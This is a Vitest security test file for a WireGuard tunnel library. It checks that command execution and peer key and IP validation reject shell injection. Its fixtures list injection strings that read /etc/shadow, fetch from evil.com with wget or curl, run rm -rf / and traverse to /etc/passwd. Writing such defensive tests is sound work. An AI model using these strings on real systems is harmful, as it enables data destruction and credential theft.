import { describe, it, expect } from 'vitest';
import { safeExec, SystemWireGuardDriver, generateWireGuardKeyPair } from '@bharattunnel/wireguard';
import { DEVICE_NAME_REGEX, WIREGUARD_KEY_REGEX, IPV4_REGEX } from '@bharattunnel/shared';

describe('Security Audit: Command Injection Defenses', () => {
  describe('safeExec Process Isolation', () => {
    it('treats shell metacharacters as inert literal strings', async () => {
      // Running node with arguments containing shell metacharacters
      const injectionPayload = '; echo INJECTED_EXECUTION;';
      const result = await safeExec(process.execPath, [
        '-e',
        'console.log(process.argv[1]);',
        injectionPayload,
      ]);

      expect(result.exitCode).toBe(0);
      // The payload must be printed verbatim, not executed as a command
      expect(result.stdout.trim()).toBe(injectionPayload);
    });

    it('rejects prohibited control characters and null bytes in arguments', async () => {
      await expect(
        safeExec(process.execPath, ['-e', 'console.log("hi")', 'test\x00arg'])
      ).rejects.toThrow(/prohibited control characters/);

      await expect(
        safeExec(process.execPath, ['-e', 'console.log("hi")', 'test\nnewline'])
      ).rejects.toThrow(/prohibited control characters/);
    });

    it('rejects illegal executable paths', async () => {
      await expect(
        safeExec('wg; reboot;', [])
      ).rejects.toThrow(/Invalid executable path/);
    });
  });

  describe('SystemWireGuardDriver Input Whitelisting', () => {
    const driver = new SystemWireGuardDriver('wg0', '/usr/bin/wg');

    it('rejects command injection attempts in WireGuard public key', async () => {
      const maliciousKeys = [
        'key; cat /etc/shadow; #',
        'key && wget evil.com/malware',
        '$(reboot)',
        '`curl evil.com`',
        '../../../../etc/passwd',
      ];

      for (const badKey of maliciousKeys) {
        expect(WIREGUARD_KEY_REGEX.test(badKey)).toBe(false);
        await expect(driver.addPeer(badKey, '10.50.0.2')).rejects.toThrow(/Invalid WireGuard public key/);
        await expect(driver.removePeer(badKey)).rejects.toThrow(/Invalid WireGuard public key/);
      }
    });

    it('rejects command injection attempts in allowed IP address', async () => {
      const maliciousIps = [
        '10.50.0.2; rm -rf /',
        '10.50.0.2 && echo pwned',
        '10.50.0.2/32; id;',
        '10.50.0.999',
      ];

      const validKey = generateWireGuardKeyPair().publicKey;

      for (const badIp of maliciousIps) {
        expect(IPV4_REGEX.test(badIp.replace('/32', ''))).toBe(false);
        await expect(driver.addPeer(validKey, badIp)).rejects.toThrow(/Invalid allowed IP address/);
      }
    });
  });
});
